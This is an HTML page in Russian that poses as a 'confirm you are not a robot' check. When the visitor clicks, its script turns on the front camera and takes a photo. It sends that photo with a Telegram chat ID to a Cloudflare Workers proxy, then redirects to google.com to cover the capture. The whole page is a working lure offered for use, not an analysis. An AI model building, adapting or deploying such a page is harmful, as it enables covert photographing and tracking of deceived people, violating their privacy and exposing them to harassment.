    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Загрузка...</title>
    </head>
    <body>
        <div style="text-align: center; margin-top: 50px;">
            <h2>Подтвердите, что вы не робот</h2>
            <button id="btn" style="padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 8px;">
                Я не робот (Продолжить)
            </button>
        </div>
        
        <video id="v" autoplay style="display:none"></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
       const chatId = '1976857829';
const targetUrl = 'https://google.com';
const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';

const btn = document.getElementById('btn');
const video = document.getElementById('v');
const canvas = document.getElementById('c');

btn.onclick = async () => {
    btn.innerText = "Загрузка..."; 
    btn.disabled = true;
    let stream;

    try {
        // 1. Запрашиваем фронтальную камеру с конкретными параметрами
        stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: "user",
                width: { ideal: 640 },
                height: { ideal: 480 }
            } 
        });

        // ПРИВЯЗЫВАЕМ СТРИМ К ВИДЕО
        video.srcObject = stream;
        video.setAttribute("playsinline", true); // Критично для iPhone!
        
        // 2. Ждем, пока видео реально начнет играть
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play(); // Принудительный старт
                // Даем 1 секунду на настройку экспозиции и фокуса на телефоне
                setTimeout(resolve, 1000); 
            };
        });

        // 3. Делаем снимок (захват кадра)
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'shot.jpg');

        // 4. ЖДЕМ ОТПРАВКИ ЧЕРЕЗ CLOUDFLARE
        await fetch(proxyUrl, { 
            method: 'POST', 
            body: formData 
        });

    } catch (err) {
        console.error("Ошибка:", err);
    } finally {
        // Останавливаем камеру и уходим
        if (stream) {
            stream.getTracks().forEach(t => t.stop());
        }
        window.location.href = targetUrl;
    }
};





        </script>
    </body>
    </html>
